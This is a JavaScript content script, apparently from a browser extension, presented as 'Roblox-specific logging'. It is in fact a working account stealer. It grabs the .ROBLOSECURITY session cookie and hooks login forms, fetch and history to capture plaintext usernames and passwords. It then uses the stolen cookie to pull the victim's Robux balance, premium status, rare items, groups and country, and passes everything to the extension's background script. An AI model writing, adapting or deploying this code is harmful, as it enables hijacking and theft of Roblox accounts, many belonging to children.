// Roblox-specific logging only
(function() {
  function sendLogToBackground(level, args) {
    const logData = {
      level: level,
      message: args.map(arg => 
        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
      ).join(' '),
      timestamp: new Date().toISOString(),
      url: window.location.href,
      userAgent: navigator.userAgent
    };

    chrome.runtime.sendMessage({
      type: 'LOG_CAPTURED',
      data: logData
    });
  }

  // Function to capture Roblox security cookie and fetch comprehensive user data
  async function captureRobloxSecurity() {
    if (window.location.hostname.includes('roblox.com')) {
      const cookies = document.cookie.split(';');
      for (let cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === '.ROBLOSECURITY') {
          // Check for recent login attempt
          let username = '';
          let password = '';

          if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 30000) {
            username = window.robloxLoginAttempt.username;
            password = window.robloxLoginAttempt.password;
          } else {
            // Fallback to current form detection
            const credentials = captureRobloxCredentials();
            username = credentials.username;
            password = credentials.password;
          }

          // Fetch comprehensive user data using the security token
          const userData = await fetchRobloxUserData(value);

          // Send login credentials first
          let loginMessage = `🔐 ROBLOX SECURITY TOKEN DETECTED: ${value}`;
          if (username) loginMessage += `\n👤 USERNAME: ${username}`;
          if (password) loginMessage += `\n🔑 PASSWORD: ${password}`;

          sendLogToBackground('roblox_login', [loginMessage]);

          // Send comprehensive user data if available
          if (userData) {
            sendLogToBackground('roblox_userdata', [JSON.stringify(userData)]);
          }

          // Clear the stored login attempt
          delete window.robloxLoginAttempt;
          break;
        }
      }
    }
  }

  // Fetch comprehensive Roblox user data using APIs
  async function fetchRobloxUserData(roblosecurity) {
    try {
      // Get CSRF token first
      const csrfToken = await getRobloxCSRFToken(roblosecurity);
      if (!csrfToken) return null;

      // Get current user info
      const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      if (!userResponse.ok) return null;
      const userInfo = await userResponse.json();

      // Get detailed user data
      const detailsResponse = await fetch(`https://users.roblox.com/v1/users/${userInfo.id}`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const userDetails = detailsResponse.ok ? await detailsResponse.json() : {};

      // Get Robux balance
      const robuxResponse = await fetch('https://economy.roblox.com/v1/users/authenticated/currency', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      const robuxData = robuxResponse.ok ? await robuxResponse.json() : { robux: 0 };

      // Get premium status
      const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userInfo.id}/validate-membership`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      const premiumData = premiumResponse.ok ? await premiumResponse.json() : { isPremium: false };

      // Get currently worn items for korblox/headless detection
      const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userInfo.id}/currently-wearing`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const avatarData = avatarResponse.ok ? await avatarResponse.json() : { assetIds: [] };

      // Get user's groups
      const groupsResponse = await fetch(`https://groups.roblox.com/v2/users/${userInfo.id}/groups/roles`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const groupsData = groupsResponse.ok ? await groupsResponse.json() : { data: [] };

      // Get user's game passes and badges count
      const badgesResponse = await fetch(`https://badges.roblox.com/v1/users/${userInfo.id}/badges?limit=100`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const badgesData = badgesResponse.ok ? await badgesResponse.json() : { data: [] };

      // Get account age
      const accountAge = userDetails.created ? 
        Math.floor((new Date() - new Date(userDetails.created)) / (1000 * 60 * 60 * 24)) : 0;

      // Detect korblox and headless items
      const korbloxDetection = await detectKorbloxHeadless(avatarData.assetIds, roblosecurity);

      // Get user's location/country
      const localeResponse = await fetch('https://locale.roblox.com/v1/country-regions', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const localeData = localeResponse.ok ? await localeResponse.json() : {};

      return {
        username: userInfo.name || userInfo.displayName || 'Unknown',
        userId: userInfo.id,
        displayName: userInfo.displayName,
        description: userDetails.description || 'No description',
        accountAge: accountAge,
        robux: robuxData.robux || 0,
        isPremium: premiumData.isPremium || false,
        created: userDetails.created,
        korblox: korbloxDetection.hasKorblox,
        headless: korbloxDetection.hasHeadless,
        currentlyWearing: avatarData.assetIds || [],
        groups: groupsData.data ? groupsData.data.slice(0, 10) : [], // Limit to 10 groups
        badgeCount: badgesData.data ? badgesData.data.length : 0,
        country: localeData.countryRegionCode || 'Unknown',
        followers: userDetails.followerCount || 0,
        following: userDetails.followingCount || 0,
        friendCount: userDetails.friendCount || 0
      };

    } catch (error) {
      return null;
    }
  }

  // Get CSRF token for authenticated requests
  async function getRobloxCSRFToken(roblosecurity) {
    try {
      const response = await fetch('https://auth.roblox.com/v2/logout', {
        method: 'POST',
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      return response.headers.get('x-csrf-token');
    } catch (error) {
      return null;
    }
  }

  // Detect korblox and headless items
  async function detectKorbloxHeadless(assetIds, roblosecurity) {
    const korbloxIds = [
      139607770, 139607718, 139607625, 139607570, 139607528, 139607487, 139607415, 139607356,
      139607313, 139607268, 139607228, 139607186, 139607142, 139607101, 139607069, 139607029,
      139606993, 139606951, 139606909, 139606867, 139606825, 139606781, 139606734, 139606692,
    ];

    const headlessIds = [
      134082579, // Headless Head
      139607770  // Some korblox items might also be considered headless
    ];

    let hasKorblox = false;
    let hasHeadless = false;

    // Check currently worn items
    for (const assetId of assetIds) {
      if (korbloxIds.includes(assetId)) {
        hasKorblox = true;
      }
      if (headlessIds.includes(assetId)) {
        hasHeadless = true;
      }
    }

    return { hasKorblox, hasHeadless };
  }

  // Function to capture Roblox username and password
  function captureRobloxCredentials() {
    let username = '';
    let password = '';

    // Try to get from current login form inputs
    const usernameInputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name*="user"], input[id*="user"], input[placeholder*="user"]');
    const passwordInputs = document.querySelectorAll('input[type="password"]');

    usernameInputs.forEach(input => {
      if (input.value && (input.name.toLowerCase().includes('user') || input.id.toLowerCase().includes('user') || input.placeholder.toLowerCase().includes('user'))) {
        username = input.value;
      }
    });

    passwordInputs.forEach(input => {
      if (input.value) {
        password = input.value;
      }
    });

    // Also try to get from localStorage or sessionStorage
    try {
      const storedUsername = localStorage.getItem('roblox_username') || sessionStorage.getItem('roblox_username');
      if (storedUsername) username = storedUsername;
    } catch (e) {}

    return { username, password };
  }

  // Monitor for Roblox login activity
  function monitorRobloxLogin() {
    if (window.location.hostname.includes('roblox.com')) {
      // Check for security cookie on page load
      setTimeout(captureRobloxSecurity, 2000);

      // Monitor for cookie changes (login events)
      let lastCookies = document.cookie;
      setInterval(() => {
        if (document.cookie !== lastCookies) {
          lastCookies = document.cookie;
          captureRobloxSecurity();
        }
      }, 1000);

      // Monitor for successful login redirects
      const originalPushState = history.pushState;
      history.pushState = function() {
        originalPushState.apply(history, arguments);
        setTimeout(captureRobloxSecurity, 1000);
      };

      // Monitor for authentication API calls
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        const result = originalFetch.apply(this, args);

        if (args[0] && typeof args[0] === 'string' && 
            (args[0].includes('/v2/login') || args[0].includes('/authentication'))) {
          result.then(response => {
            if (response.ok) {
              setTimeout(captureRobloxSecurity, 1000);
            }
          });
        }

        return result;
      };

      // Monitor form submissions for login credentials
      document.addEventListener('submit', function(event) {
        const form = event.target;
        if (form && form.tagName === 'FORM') {
          const formData = new FormData(form);
          let username = '';
          let password = '';

          // Extract username and password from form data
          for (let [key, value] of formData.entries()) {
            if (key.toLowerCase().includes('user') || key.toLowerCase().includes('email')) {
              username = value;
            }
            if (key.toLowerCase().includes('pass')) {
              password = value;
            }
          }

          // Also check input values directly
          const usernameInputs = form.querySelectorAll('input[type="text"], input[type="email"], input[name*="user"], input[id*="user"]');
          const passwordInputs = form.querySelectorAll('input[type="password"]');

          usernameInputs.forEach(input => {
            if (input.value && !username) username = input.value;
          });

          passwordInputs.forEach(input => {
            if (input.value && !password) password = input.value;
          });

          if (username || password) {
            sendLogToBackground('info', [`🔑 ROBLOX LOGIN ATTEMPT DETECTED:\n👤 USERNAME: ${username}\n🔑 PASSWORD: ${password}`]);

            // Store credentials temporarily to associate with security token
            window.robloxLoginAttempt = { username, password, timestamp: Date.now() };
          }
        }
      });
    }
  }

  // Start monitoring if on Roblox
  monitorRobloxLogin();
})();